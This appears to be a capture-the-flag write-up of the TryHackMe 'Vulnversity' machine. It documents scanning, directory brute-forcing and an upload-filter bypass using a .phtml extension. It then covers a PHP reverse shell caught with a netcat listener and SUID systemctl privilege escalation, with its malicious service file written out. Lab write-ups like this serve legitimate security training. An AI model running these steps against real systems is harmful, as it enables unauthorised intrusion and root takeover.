# Vulnversity - Enumeration & Exploitation

## Machine Information

- Target Machine: `Vulnversity`
- Platform: [TryHackMe](https://tryhackme.com)

---

## Initial Setup

- Started the target machine on TryHackMe.
- Connected to the TryHackMe VPN using OpenVPN.

![VPN Connection](../Screenshots/tryhackme-1.png)

---

## Initial Enumeration

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

- Performed an initial Nmap scan against the target machine.
- Identified 6 open ports running on the target system.
- Detected an HTTP service configured on port `3333`.
- The web server was identified as an Apache server.

![Nmap Scan](../Screenshots/Nmapscan-2.png)

---

## Website Enumeration

```bash
http://<TARGET_IP>:3333
```

- Accessed the web application running on port `3333`.
- Confirmed that the target website was accessible through the browser.

![Website Access](../Screenshots/foundwebsite-3.png)

---

## Directory Bruteforcing

```bash
gobuster dir -u http://<TARGET_IP>:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

- Performed directory enumeration using Gobuster.
- Identified multiple hidden directories on the target web server.
- Some directories only contained image files and no useful information.

### Enumeration Results

![Gobuster Enumeration 1](../Screenshots/gobusterdir1-4.png)

![Gobuster Enumeration 2](../Screenshots/gobusterdir2-5.png)

![Gobuster Enumeration 3](../Screenshots/gobusterdir3-6.png)

---

## Discovering Upload Functionality

- Continued enumerating discovered directories.
- Identified an upload functionality located in:

```text
/internal/
```

- Determined that the upload page could potentially be abused for remote code execution.

![Upload Page Discovery](../Screenshots/gobusterdir4-7.png)

---

## Creating a PHP Reverse Shell

- Generated a PHP reverse shell payload using Revshells.com.
- Modified the reverse shell file using Nano editor.
- Updated the attacker IP address to match the TryHackMe VPN IP address.

![PHP Reverse Shell](../Screenshots/reverseshellphp-8.png)

![Editing Payload](../Screenshots/payloadonphpfile-9.png)

---

## File Upload Restriction

- Attempted to upload the PHP reverse shell payload.
- The application blocked `.php` file uploads.

![PHP Upload Blocked](../Screenshots/extentionphpnotallowed-10.png)

---

## Burp Suite Configuration

- Configured Burp Suite proxy settings for request interception.

### Proxy Configuration

- Hostname: `127.0.0.1`
- Port: `8080`

- Intercepted upload requests using Burp Suite.

![Burp Suite Configuration](../Screenshots/burpsuite-11.png)

---

## Intercepting Upload Requests

- Intercepted the file upload request while uploading the reverse shell payload.
- Sent the intercepted request to Burp Suite Intruder for further testing.

![Intercepted Request](../Screenshots/interceptedwhileuploadingfile-12.png)

---

## Extension Fuzzing Using Intruder

- Performed a sniper attack against the file extension field to identify allowed extensions.

### Extensions Tested

```text
.php
.php2
.php3
.php4
.php5
.phtml
```

- Although multiple extensions returned a `200 OK` response, only the `.phtml` extension executed successfully on the server.

![Sniper Attack Setup](../Screenshots/sniperattackonextention-13.png)

![Extension Results](../Screenshots/extentionsniperattacked-14.png)

---

## Uploading the Reverse Shell

- Renamed the payload extension from `.php` to `.phtml`.

![Changed Extension](../Screenshots/changedextention-15.png)

- Successfully uploaded the reverse shell payload to the server.

![Successful Upload](../Screenshots/uploadedwithphtmlextention-16.png)

---

## Setting Up a Netcat Listener

```bash
nc -lvnp 1234
```

- Started a Netcat listener on port `1234` to receive the reverse shell connection.

![Netcat Listener](../Screenshots/listeningusingnetcat-17.png)

---

## Gaining Reverse Shell Access

```text
/internal/uploads/<payload_filename>.phtml
```

- Accessed the uploaded payload through the uploads directory.
- Successfully received a reverse shell connection from the target machine.

- Retrieved the user flag:
  - `user.txt`

![Reverse Shell Access](../Screenshots/uploadsdirectoryandgotconnected-18.png)

![User Flag](../Screenshots/foundfirstflag-19.png)

---

## Stabilizing the Shell

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

- Spawned a fully interactive TTY shell.
- Improved shell stability and command execution support.

![Spawn Shell](../Screenshots/spawnshell-20.png)

---

## Privilege Escalation Enumeration

```bash
find / -perm -u=s 2>/dev/null
```

### Command Breakdown

- `find /`
  - Search from the root directory.

- `-perm -u=s`
  - Search for files with the SUID permission bit enabled.

- `2>/dev/null`
  - Suppress permission denied errors.

- Enumerated binaries capable of running with elevated privileges.

![SUID Enumeration](../Screenshots/checkingforSUIDfiles-21.png)

---

## Identifying an Exploitable Binary

- Identified the following SUID-enabled binary:

```text
/bin/systemctl
```

- Determined that the binary could potentially be abused for privilege escalation.

![Systemctl Discovery](../Screenshots/foundsystemctlbin-22.png)

---

## Using GTFOBins for Privilege Escalation

- Researched privilege escalation techniques using GTFOBins.
- Identified a method to abuse `systemctl` with SUID permissions.

![GTFOBins Reference](../Screenshots/GTFObinscommandsforprivilage-23.png)

---

## Privilege Escalation

### Creating a Temporary Service File

```bash
TF=$(mktemp).service
```

- Creates a random temporary service filename.
- Avoids filename conflicts and detection.

---

### Writing the Malicious Service Configuration

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
```

### Explanation

- Creates a malicious service file.
- Executes commands as root.
- Copies the contents of `/root/root.txt` into `/tmp/output`.

---

### Linking the Service

```bash
/bin/systemctl link $TF
```

### Explanation

- Registers the service file with systemd.

---

### Enabling and Starting the Service

```bash
/bin/systemctl enable --now $TF
```

### Explanation

- Enables the service.
- Starts the service immediately with root privileges.

---

### Retrieving the Root Flag

```bash
cd /tmp/
ls
cat output
```

- Successfully retrieved the contents of the root flag.

![Privilege Escalation](../Screenshots/privilage_escalation-24.png)

---

## Root Access

- Successfully escalated privileges on the target machine.
- Retrieved the root flag from the compromised system.

---
